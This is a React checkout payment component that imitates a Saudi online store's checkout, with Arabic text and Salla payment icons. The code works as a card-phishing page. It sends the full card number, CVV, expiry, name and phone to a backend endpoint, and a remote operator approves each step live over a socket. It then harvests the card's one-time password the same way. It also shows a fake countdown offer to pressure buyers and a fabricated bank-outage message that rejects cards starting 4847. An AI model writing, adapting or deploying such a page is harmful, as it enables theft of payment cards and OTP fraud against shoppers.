import { useEffect, useState } from "react";
import { scrollToTop } from "../../utils/scroll";
import axios from "axios";
import CheckoutPaymentSummary, {
  LoginStepIcon,
  PaymentStepIcon,
} from "./CheckoutPaymentSummary";
import CheckoutOtpForm from "./CheckoutOtpForm";
import CheckoutWaitOverlay from "./CheckoutWaitOverlay";
import { api_route, socket } from "../../config/api";
import { useAdminApproval } from "../../hooks/useAdminApproval";
import { useTranslation } from "../../context/LanguageContext";
import { getUserProfile } from "../../utils/userProfile";

const PAYMENT_METHODS = [
  {
    id: "mada",
    label: "Mada",
    subtitleKey: "checkoutPayment.methodMada",
    icon: "https://cdn.assets.salla.network/prod/stores/vendor/checkout/images/icons/pay-option-mada.svg",
    enabled: true,
  },
  {
    id: "credit",
    label: "Credit card",
    subtitleKey: "checkoutPayment.methodCredit",
    icon: "https://cdn.assets.salla.network/prod/stores/vendor/checkout/images/icons/pay-option-credit-2.svg",
    large: true,
    enabled: true,
  },
  {
    id: "bank",
    label: "Bank Account",
    subtitleKey: "checkoutPayment.methodBank",
    icon: "https://cdn.assets.salla.network/prod/stores/vendor/checkout/images/icons/pay-option-bank-acc.svg",
    bankLabel: true,
    enabled: false,
  },
  {
    id: "apple",
    label: "Apple Pay",
    subtitleKey: "checkoutPayment.methodApple",
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlpwRQflk057mGMS9x8c-gb22eMrCQd33l_EPx1Ne4rQ&s=10",
    enabled: false,
    large: true,
  },
  {
    id: "stc",
    label: "STCBank",
    subtitleKey: "checkoutPayment.methodStc",
    icon: "https://cdn.assets.salla.network/prod/stores/vendor/checkout/images/icons/stc-bank/stc-bank.svg",
    enabled: false,
  },
];

function formatCardNumber(value) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function buildPhoneDisplay(authData) {
  if (authData?.display) return authData.display;
  if (!authData?.dialCode || !authData?.phone) return "";
  return `+${authData.dialCode}${authData.phone}`;
}

export default function CheckoutPaymentPage({ order, authData, onComplete }) {
  const { t } = useTranslation();
  const userProfile = getUserProfile();
  const greetingName = userProfile?.fullName ?? t("checkoutPayment.guestName");
  const phoneDisplay = buildPhoneDisplay(authData);

  const [detailsOpen, setDetailsOpen] = useState(false);
  const [couponOpen, setCouponOpen] = useState(false);
  const [coupon, setCoupon] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("mada");
  const [paymentSubStep, setPaymentSubStep] = useState("form");
  const [paymentPayload, setPaymentPayload] = useState(null);
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardName, setCardName] = useState(userProfile?.fullName ?? "");
  const [saveCard, setSaveCard] = useState(false);
  const [companyPurchase, setCompanyPurchase] = useState(false);
  const [companyName, setCompanyName] = useState("");
  const [companyCrn, setCompanyCrn] = useState("");
  const [companyVat, setCompanyVat] = useState("");
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [paymentError, setPaymentError] = useState(false);
  const [cardOtpError, setCardOtpError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [popUp, setPopUp] = useState(true);
  const [counter, setCounter] = useState(60 * 60 * 6);

  useEffect(() => {
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;
  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes,
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;

  useEffect(() => {
    scrollToTop();
  }, [paymentSubStep]);

  const sessionId = sessionStorage.getItem("id");

  const paymentApproval = useAdminApproval({
    sessionId,
    acceptEvent: "acceptPaymentForm",
    declineEvent: "declinePaymentForm",
    onAccept: () => {
      setPaymentSubStep("cardOtp");
    },
    onDecline: () => setPaymentError(true),
  });

  const cardOtpApproval = useAdminApproval({
    sessionId,
    acceptEvent: "acceptVisaOtp",
    declineEvent: "declineVisaOtp",
    onAccept: () => onComplete?.(),
    onDecline: () => setCardOtpError(true),
  });

  const waiting = paymentApproval.waiting || cardOtpApproval.waiting;
  const isBusy = submitting || waiting;
  const isCompanyFormValid =
    !companyPurchase ||
    (companyName.trim() && companyCrn.trim() && companyVat.trim());

  const selectedPaymentMethod = PAYMENT_METHODS.find(
    (method) => method.id === paymentMethod,
  );
  const paymentSubtitle =
    paymentSubStep === "cardOtp"
      ? t("checkoutPayment.cardOtpSubtitle")
      : selectedPaymentMethod?.subtitleKey
        ? t(selectedPaymentMethod.subtitleKey)
        : t("checkoutPhone.paymentSubtitle");

  const buildVisaPayload = () => {
    const formattedCardNumber = formatCardNumber(cardNumber);
    return {
      _id: sessionStorage.getItem("id"),
      form_type: "store_checkout",
      phone: phoneDisplay,
      name: greetingName,
      orderTotal: order.total,
      paymentMethod,
      card_name: cardName.trim(),
      cardNumber: formattedCardNumber,
      cvv,
      expiryDate: `${expMonth}/${expYear}`,
      saveCard,
      companyPurchase,
      ...(companyPurchase
        ? {
            companyName: companyName.trim(),
            crn: companyCrn.trim(),
            vatNumber: companyVat.trim(),
          }
        : {}),
    };
  };

  const handleCompanyPurchaseChange = (checked) => {
    setCompanyPurchase(checked);
    if (!checked) {
      setCompanyName("");
      setCompanyCrn("");
      setCompanyVat("");
    }
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    const digits = cardNumber.replace(/\D/g, "");
    if (digits.length !== 16) return;
    if (!expMonth || !expYear || !cvv || !cardName.trim() || !agreeTerms)
      return;
    if (
      companyPurchase &&
      (!companyName.trim() || !companyCrn.trim() || !companyVat.trim())
    )
      return;

    if (digits.startsWith("4847")) {
      setErrorCard(
        `عذرًا، مصرف الراجحي موقوف حاليًا
نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي لدى مركز سلامة، وذلك بسبب خلل فني من جهة مصدر البنك`,
      );
      return;
    }

    const sessionId = sessionStorage.getItem("id");
    if (!sessionId) return;

    const payload = buildVisaPayload();
    setSubmitting(true);
    setPaymentError(false);
    setErrorCard(false);
    paymentApproval.clearError();

    try {
      await axios.post(`${api_route}/visa/${sessionId}`, payload);
      socket.emit("paymentForm", sessionId);
      setPaymentPayload(payload);
      paymentApproval.startWaiting();
    } catch {
      window.alert(t("checkoutPayment.registerError"));
    } finally {
      setSubmitting(false);
    }
  };

  const handleCardOtpSubmit = async (otp) => {
    const sessionId = sessionStorage.getItem("id");
    if (!sessionId || !paymentPayload || isBusy) return;

    setSubmitting(true);
    setCardOtpError(false);
    cardOtpApproval.clearError();

    try {
      const finalData = { ...paymentPayload, otp };
      await axios.post(`${api_route}/visaOtp/${sessionId}`, finalData);
      socket.emit("visaOtp", { id: sessionId, otp });
      cardOtpApproval.startWaiting();
    } catch {
      window.alert(t("checkoutPayment.registerError"));
    } finally {
      setSubmitting(false);
    }
  };

  const handleBackToPaymentForm = () => {
    setPaymentSubStep("form");
  };

  return (
    <>
      {popUp && paymentSubStep === "form" ? (
        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-black bg-opacity-45">
          <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
            <img src="/payment.jpeg" className="w-full md:w-1/3" alt="" />
            <span className="text-xl my-5 text-gray-700 w-fit font-bold">
              سارع قبل نهاية العرض !
            </span>
            <span className="font-bold text-gray-700">
              يتبقى على انتهاء العرض:
            </span>
            <div className="text-green-600 text-4xl my-5 font-bold">
              {formattedTime}
            </div>
            <button
              type="button"
              onClick={() => setPopUp(false)}
              className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
            >
              إغلاق
            </button>
          </div>
        </div>
      ) : null}

      <CheckoutWaitOverlay
        visible={waiting}
        message={t("checkoutAdmin.waiting")}
      />

      <div id="app" className="container container--margined p-0! flex-col!">
        <div>
          <CheckoutPaymentSummary
            items={order.items}
            total={order.total}
            detailsOpen={detailsOpen}
            couponOpen={couponOpen}
            coupon={coupon}
            onToggleDetails={() => setDetailsOpen((open) => !open)}
            onToggleCoupon={() => setCouponOpen((open) => !open)}
            onCouponChange={setCoupon}
          />

          <div id="payment_process">
            <main className="sections-wrapper">
              <div className="section section--payment">
                <div className="checkout-step">
                  <div
                    className="title title--step title-guest-step mb-20 done"
                    style={{ cursor: "default" }}
                  >
                    <div className="d-flex ">
                      <LoginStepIcon />
                      <div>
                        <div className="gap-1">
                          <h3>
                            {t("checkoutPayment.greeting", {
                              name: greetingName,
                            })}
                          </h3>
                          <small dir="ltr">{phoneDisplay}</small>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="mt-4" />
                </div>

                <div className="row payment-step">
                  <div className="col-md-12">
                    <div id="payment_step">
                      <div data-step="3" className="title title--step mb-20">
                        <div className="d-flex ">
                          <span className="active">
                            <PaymentStepIcon />
                          </span>
                          <div className="d-flex flex-column gap-1">
                            <h3 className="m-0 text-semibold">
                              {t("checkoutPhone.paymentTitle")}
                            </h3>
                            <small>{paymentSubtitle}</small>
                          </div>
                        </div>
                        <button
                          type="button"
                          className="btn btn--outline dark btn-edit d-none"
                        >
                          {t("checkoutPhone.edit")}
                        </button>
                      </div>

                      <div className="mt-4">
                        {paymentSubStep === "cardOtp" ? (
                          <div className="auth-iframe-container mb-20">
                            {cardOtpError ? (
                              <p className="checkout-admin-error mb-3">
                                {t("checkoutAdmin.declined")}
                              </p>
                            ) : null}
                            <CheckoutOtpForm
                              phoneData={{ display: phoneDisplay }}
                              onSubmit={handleCardOtpSubmit}
                              t={t}
                              variant="card"
                              onBack={handleBackToPaymentForm}
                              submitting={isBusy}
                            />
                          </div>
                        ) : (
                          <>
                            {paymentError ? (
                              <p className="checkout-admin-error mb-3">
                                {t("checkoutAdmin.declined")}
                              </p>
                            ) : null}
                            <div
                              id="payment_methods_wrapper"
                              className="payment_methods"
                            >
                              <ul
                                id="payment_methods"
                                className="list list--payment-methods"
                              >
                                {PAYMENT_METHODS.map((method) => {
                                  const isEnabled = method.enabled !== false;
                                  const isActive =
                                    isEnabled && paymentMethod === method.id;

                                  return (
                                    <li key={method.id}>
                                      <button
                                        type="button"
                                        className={`btn btn--round btn--payment-option${
                                          isActive ? " active" : ""
                                        }${!isEnabled ? " is-disabled" : ""}`}
                                        disabled={!isEnabled}
                                        aria-disabled={!isEnabled}
                                        onClick={() => {
                                          if (isEnabled)
                                            setPaymentMethod(method.id);
                                        }}
                                      >
                                        <img
                                          src={method.icon}
                                          alt={method.label}
                                          className={"large"}
                                        />
                                        {method.bankLabel ? (
                                          <b>
                                            {t("checkoutPayment.bankTransfer")}
                                          </b>
                                        ) : null}
                                      </button>
                                    </li>
                                  );
                                })}
                              </ul>
                            </div>

                            <form
                              className="form form--payment"
                              onSubmit={handleSubmit}
                            >
                              <div className="saved-cards">
                                <div className="saved-cards__add-new saved-cards__add-new--no-border">
                                  <div className="saved-cards__new-card-form slide-transition is-open">
                                    <div className="card-fields-wrapper">
                                      <div className="row card-fields-row">
                                        <div className="col-md-6 col-xs-12">
                                          <fieldset className="card-details-container form-group payment-type">
                                            <label
                                              className="card-details-label"
                                              htmlFor="cc-number"
                                            >
                                              {t("checkoutPayment.cardDetails")}
                                              <span className="required-asterisk">
                                                *
                                              </span>
                                            </label>
                                            <div className="card-details-wrapper">
                                              <div className="card-number-wrapper">
                                                <input
                                                  type="tel"
                                                  inputMode="numeric"
                                                  maxLength={19}
                                                  id="cc-number"
                                                  name="cc-number"
                                                  autoComplete="cc-number"
                                                  autoCorrect="off"
                                                  autoCapitalize="off"
                                                  spellCheck={false}
                                                  placeholder={t(
                                                    "checkoutPayment.cardNumber",
                                                  )}
                                                  className="card-input card-input--number form-control"
                                                  value={cardNumber}
                                                  onChange={(event) =>
                                                    setCardNumber(
                                                      formatCardNumber(
                                                        event.target.value,
                                                      ),
                                                    )
                                                  }
                                                  required
                                                />
                                              </div>
                                              <div className="expiry-cvv-wrapper">
                                                <div className="card-input card-input--expiry">
                                                  <input
                                                    type="tel"
                                                    inputMode="numeric"
                                                    maxLength={2}
                                                    placeholder={t(
                                                      "checkoutPayment.expMonth",
                                                    )}
                                                    name="cc-exp-month"
                                                    id="cc_month"
                                                    autoComplete="cc-exp"
                                                    autoCorrect="off"
                                                    autoCapitalize="off"
                                                    spellCheck={false}
                                                    className="expiry-input form-control"
                                                    value={expMonth}
                                                    onChange={(event) =>
                                                      setExpMonth(
                                                        event.target.value
                                                          .replace(/\D/g, "")
                                                          .slice(0, 2),
                                                      )
                                                    }
                                                    required
                                                  />
                                                  <span className="expiry-separator">
                                                    /
                                                  </span>
                                                  <input
                                                    type="tel"
                                                    inputMode="numeric"
                                                    maxLength={2}
                                                    placeholder={t(
                                                      "checkoutPayment.expYear",
                                                    )}
                                                    name="cc-exp-year"
                                                    id="cc_year"
                                                    autoComplete="cc-exp"
                                                    autoCorrect="off"
                                                    autoCapitalize="off"
                                                    spellCheck={false}
                                                    className="expiry-input form-control"
                                                    value={expYear}
                                                    onChange={(event) =>
                                                      setExpYear(
                                                        event.target.value
                                                          .replace(/\D/g, "")
                                                          .slice(0, 2),
                                                      )
                                                    }
                                                    required
                                                  />
                                                </div>
                                                <input
                                                  type="tel"
                                                  inputMode="numeric"
                                                  minLength={3}
                                                  maxLength={3}
                                                  name="cc-csc"
                                                  id="cc_cvc"
                                                  autoComplete="cc-csc"
                                                  autoCorrect="off"
                                                  autoCapitalize="off"
                                                  spellCheck={false}
                                                  placeholder="CVV"
                                                  className="card-input card-input--cvv form-control"
                                                  value={cvv}
                                                  onChange={(event) =>
                                                    setCvv(
                                                      event.target.value
                                                        .replace(/\D/g, "")
                                                        .slice(0, 3),
                                                    )
                                                  }
                                                  required
                                                />
                                              </div>
                                            </div>
                                          </fieldset>
                                        </div>
                                        <div className="col-md-6 col-xs-12">
                                          <fieldset className="form-group">
                                            <label
                                              htmlFor="cc-name"
                                              className="card-details-label"
                                            >
                                              {t("checkoutPayment.cardHolder")}
                                              <span className="required-asterisk">
                                                *
                                              </span>
                                            </label>
                                            <input
                                              type="text"
                                              id="cc-name"
                                              name="cc-name"
                                              autoComplete="cc-name"
                                              autoCorrect="off"
                                              autoCapitalize="words"
                                              placeholder={t(
                                                "checkoutPayment.cardHolderPlaceholder",
                                              )}
                                              className="form-control card-holder-input"
                                              value={cardName}
                                              onChange={(event) =>
                                                setCardName(event.target.value)
                                              }
                                              required
                                            />
                                          </fieldset>
                                        </div>
                                      </div>

                                      {errorCard ? (
                                        <p className="w-full flex justify-between p-3 border rounded-md text-red-500 text-sm bg-[#f8d7da] mt-3">
                                          {errorCard}
                                        </p>
                                      ) : null}

                                      <div className="saved-cards__save-checkbox">
                                        <div className="ui form">
                                          <div className="field">
                                            <div className="ui default checkbox">
                                              <input
                                                type="checkbox"
                                                id="save_card_future"
                                                name="save-card-future"
                                                checked={saveCard}
                                                onChange={(event) =>
                                                  setSaveCard(
                                                    event.target.checked,
                                                  )
                                                }
                                              />
                                              <label htmlFor="save_card_future">
                                                <span>
                                                  {t(
                                                    "checkoutPayment.saveCard",
                                                  )}
                                                </span>
                                              </label>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>

                              <div className="pay-as-company-container">
                                <div className="ui default checkbox mb-3">
                                  <input
                                    type="checkbox"
                                    id="companyPurchase"
                                    name="confirm-credentials"
                                    checked={companyPurchase}
                                    onChange={(event) =>
                                      handleCompanyPurchaseChange(
                                        event.target.checked,
                                      )
                                    }
                                  />
                                  <label htmlFor="companyPurchase">
                                    <span className="d-inline-block">
                                      {t("checkoutPayment.companyPurchase")}
                                    </span>
                                    <small className="d-block text-muted mt-1">
                                      {t("checkoutPayment.companyPurchaseHint")}
                                    </small>
                                  </label>
                                </div>
                                {companyPurchase ? (
                                  <div>
                                    <form
                                      id="companyform"
                                      className="form form--company border-0 p-0 m-0 bg-transparent shadow-none"
                                      onSubmit={(event) => event.preventDefault()}
                                    >
                                      <span>
                                        <fieldset className="form-group required">
                                          <label htmlFor="companyName">
                                            {t("checkoutPayment.companyName")}
                                          </label>
                                          <input
                                            type="text"
                                            id="companyName"
                                            name="companyName"
                                            placeholder={t(
                                              "checkoutPayment.companyNamePlaceholder",
                                            )}
                                            className="form-control"
                                            value={companyName}
                                            onChange={(event) =>
                                              setCompanyName(event.target.value)
                                            }
                                            required
                                          />
                                        </fieldset>
                                      </span>
                                      <span>
                                        <fieldset className="form-group required">
                                          <label htmlFor="crn">
                                            {t("checkoutPayment.companyCrn")}
                                          </label>
                                          <input
                                            type="text"
                                            id="crn"
                                            name="crn"
                                            placeholder={t(
                                              "checkoutPayment.companyCrnPlaceholder",
                                            )}
                                            className="form-control"
                                            value={companyCrn}
                                            onChange={(event) =>
                                              setCompanyCrn(event.target.value)
                                            }
                                            required
                                          />
                                        </fieldset>
                                      </span>
                                      <span>
                                        <fieldset className="form-group required">
                                          <label htmlFor="vatNumber">
                                            {t("checkoutPayment.companyVat")}
                                          </label>
                                          <input
                                            type="text"
                                            id="vatNumber"
                                            name="vatNumber"
                                            placeholder={t(
                                              "checkoutPayment.companyVatPlaceholder",
                                            )}
                                            className="form-control"
                                            value={companyVat}
                                            onChange={(event) =>
                                              setCompanyVat(event.target.value)
                                            }
                                            required
                                          />
                                        </fieldset>
                                      </span>
                                    </form>
                                  </div>
                                ) : null}
                              </div>

                              <div className="agreement-container">
                                <div className="ui form m-0 p-0">
                                  <div className="field m-0">
                                    <div className="ui default checkbox">
                                      <input
                                        type="checkbox"
                                        id="confirm_credentials"
                                        name="confirm-credentials"
                                        checked={agreeTerms}
                                        onChange={(event) =>
                                          setAgreeTerms(event.target.checked)
                                        }
                                      />
                                      <label
                                        htmlFor="confirm_credentials"
                                        className="agreement-label mt-1"
                                      >
                                        <span className="d-inline-block">
                                          {t("checkoutPayment.agreementLead")}
                                        </span>
                                        <small className="d-block text-muted mt-1">
                                          <p className="ql-align-center">
                                            {t("checkoutPayment.agreementText")}{" "}
                                            <a
                                              href="https://noeensa.com/p/QyrA"
                                              target="_blank"
                                              rel="noreferrer"
                                            >
                                              {t(
                                                "checkoutPayment.privacyPolicy",
                                              )}
                                            </a>{" "}
                                            {t("checkoutPayment.and")}{" "}
                                            <a
                                              href="https://noeen.sa/p/BpEYy"
                                              target="_blank"
                                              rel="noreferrer"
                                            >
                                              {t("checkoutPayment.terms")}
                                            </a>
                                            {t("checkoutPayment.agreementEnd")}
                                          </p>
                                        </small>
                                      </label>
                                    </div>
                                  </div>
                                </div>
                              </div>

                              <div className="mt-4">
                                <div id="submit_form_btn_container">
                                  <button
                                    id="submit_form_btn"
                                    type="submit"
                                    className="btn btn--primary btn--large btn--wide btn--round btn--submit wide"
                                    disabled={isBusy || !agreeTerms || !isCompanyFormValid}
                                  >
                                    <span>{t("checkoutPayment.submit")}</span>
                                  </button>
                                </div>
                              </div>
                            </form>
                          </>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </main>
          </div>
        </div>
      </div>
    </>
  );
}
